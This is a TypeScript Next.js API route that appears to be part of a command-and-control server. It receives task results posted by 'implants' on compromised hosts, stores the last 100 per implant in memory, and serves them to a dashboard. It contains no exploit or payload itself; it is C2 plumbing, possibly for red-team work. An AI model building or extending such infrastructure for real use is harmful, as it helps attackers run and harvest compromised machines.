import { NextResponse, type NextRequest } from "next/server"
import { z } from "zod"

export const runtime = "nodejs"
export const dynamic = "force-dynamic"

const TaskResultSchema = z.object({
  task_id: z.string(),
  implant_id: z.string(),
  status: z.string(),
  result: z.any().optional(),
  error: z.string().optional(),
  timestamp: z.number(),
  duration: z.number(),
})

// In-memory result storage for demo purposes
const taskResults = new Map<string, Array<{
  task_id: string
  implant_id: string
  status: string
  result?: any
  error?: string
  timestamp: number
  duration: number
}>>()

export async function POST(req: NextRequest): Promise<NextResponse> {
  try {
    const body = await req.json()
    const result = TaskResultSchema.parse(body)

    // Store the result
    const results = taskResults.get(result.implant_id) || []
    results.push(result)
    
    // Keep only last 100 results per implant
    if (results.length > 100) {
      results.splice(0, results.length - 100)
    }
    
    taskResults.set(result.implant_id, results)

    console.log(`[+] Task result received from ${result.implant_id}: ${result.task_id} - ${result.status}`)
    
    return NextResponse.json({ 
      success: true,
      received: true
    })
  } catch (error) {
    console.error('Task result error:', error)
    return NextResponse.json({ error: "Invalid request" }, { status: 400 })
  }
}

// GET endpoint to retrieve results for dashboard
export async function GET(req: NextRequest): Promise<NextResponse> {
  try {
    const { searchParams } = new URL(req.url)
    const implantId = searchParams.get('implant_id')

    if (!implantId) {
      return NextResponse.json({ error: "implant_id required" }, { status: 400 })
    }

    const results = taskResults.get(implantId) || []
    
    return NextResponse.json({ 
      results: results,
      total: results.length
    })
  } catch (error) {
    console.error('Get results error:', error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}